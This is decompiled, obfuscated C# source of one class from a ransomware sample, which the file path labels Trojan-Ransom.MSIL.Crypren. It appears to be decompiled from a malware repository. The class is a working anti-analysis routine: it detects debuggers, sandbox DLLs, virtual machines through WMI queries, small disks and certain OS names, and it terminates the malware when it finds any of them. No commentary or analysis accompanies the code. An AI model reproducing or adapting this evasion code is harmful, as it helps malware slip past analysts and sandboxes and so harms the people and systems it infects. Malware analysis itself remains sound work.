// Decompiled with JetBrains decompiler
// Type: zvenNXaGjQywAfJS.RINZaKsMZBXLe
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A95A28D5-8216-4857-B945-01900B674D16
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Crypren.gen-8a4a038a965ba42a0442d44abf25e4d21f5049d4a4a8aa9cb6691ec4282814a1.exe

using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace zvenNXaGjQywAfJS
{
  internal sealed class RINZaKsMZBXLe
  {
    [NonSerialized]
    internal static GetString \u000E;

    public static void ETOjMTCHbDlnrm()
    {
      if (RINZaKsMZBXLe.wyAdPQoKAwBXJ() || RINZaKsMZBXLe.iSXxVMsEzXuR() || RINZaKsMZBXLe.pOdmrBHPwDeKIYjn() || RINZaKsMZBXLe.AkKYZcIPXn() || RINZaKsMZBXLe.xhhHpsQoiDktQCa())
        Process.GetCurrentProcess().Kill();
      Environment.FailFast((string) null);
    }

    private static bool AkKYZcIPXn()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool xhhHpsQoiDktQCa()
    {
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains(RINZaKsMZBXLe.\u000E(107409967)))
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool wyAdPQoKAwBXJ()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(RINZaKsMZBXLe.\u000E(107409994)))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject[RINZaKsMZBXLe.\u000E(107409913)].ToString().ToLower();
              if (lower == RINZaKsMZBXLe.\u000E(107409928) && managementBaseObject[RINZaKsMZBXLe.\u000E(107409899)].ToString().ToUpperInvariant().Contains(RINZaKsMZBXLe.\u000E(107409890)) || lower.Contains(RINZaKsMZBXLe.\u000E(107409845)) || managementBaseObject[RINZaKsMZBXLe.\u000E(107409899)].ToString() == RINZaKsMZBXLe.\u000E(107409836))
                return true;
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    private static bool iSXxVMsEzXuR()
    {
      bool flag = false;
      try
      {
        RINZaKsMZBXLe.AMkmNNBOQyBJpT(Process.GetCurrentProcess().Handle, ref flag);
        return flag;
      }
      catch
      {
        return flag;
      }
    }

    private static bool pOdmrBHPwDeKIYjn()
    {
      try
      {
        return RINZaKsMZBXLe.STZSwJyaoFQzdS(RINZaKsMZBXLe.\u000E(107409819)).ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    public static extern IntPtr STZSwJyaoFQzdS([In] string obj0);

    [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
    private static extern bool AMkmNNBOQyBJpT([In] IntPtr obj0, [In] ref bool obj1);

    static RINZaKsMZBXLe() => Strings.CreateGetStringDelegate(typeof (RINZaKsMZBXLe));
  }
}
